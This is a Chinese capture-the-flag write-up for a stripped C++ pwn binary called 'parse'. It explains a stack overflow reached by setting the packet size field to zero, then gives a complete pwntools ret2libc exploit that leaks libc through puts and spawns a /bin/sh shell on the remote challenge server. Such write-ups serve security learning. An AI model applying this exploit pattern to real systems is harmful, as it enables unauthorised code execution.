# parse 

> 题目可以在[Releases](https://github.com/RocketMaDev/CTFWriteup/releases/download/career/career.tar.zst)附件中找到

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |yes   |
|libc  |2.31-0ubuntu9.16|

## 解题思路

剥了符号的C++题，程序通过`getline`来获取输入，可以输入`\0`字符；
之后程序把输入的字符串复制到栈上，开头有一个签名，然后跟一个包的大小，
可以写为0，这样在构建包对象时`size`就会变成字符串的大小+0x20，可以超过0xff

当输入的长度为0x216时会覆盖到栈上的一个标志，之后可以利用栈溢出

```c
void copyToBuf(Packet *packet,void *src)
{
    undefined buf [256];
    
    std::__cxx11::basic_string<>::c_str(&packet->content);
    memcpy(buf,src,(ulong)(uint)packet->size);
    return;
}
```

设置标志后就会执行上面的函数，然后打rop回到`main`函数再来一次栈溢出就可以

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './parse'

def payload(lo:int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
        libc = ELF('/usr/lib/libc.so.6')
    else:
        sh = remote('10.10.26.199', 27370)
        libc = ELF('./libc-2.31.so')
    elf = ELF(EXE)
    gadgets = ROP(elf)
    rdi = gadgets.rdi.address
    ret = gadgets.ret.address
    main = 0x4014e1

    def mkPacket(rop: bytes) -> bytes:
        head = p32(0x12345678) + p32(0)
        return (head + b'0'*0x108 + rop).ljust(0x200) + b'0'*16

    sh.sendline(mkPacket(p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)))

    sh.recvuntil(b'....\n')
    libcBase = u64(sh.recv(6) + b'\0\0') - libc.symbols['puts']
    success(GOLD_TEXT(f'Leak libcBase: {libcBase:#x}'))
    libc.address = libcBase
    
    sh.sendline(mkPacket(p64(rdi) + p64(next(libc.search(b'/bin/sh'))) +
                         p64(ret) + p64(libc.symbols['system'])))

    sh.clean()
    sh.interactive()
```

> 环境给了个静态flag，结果显示提交错误，最后换成了动态flag才成
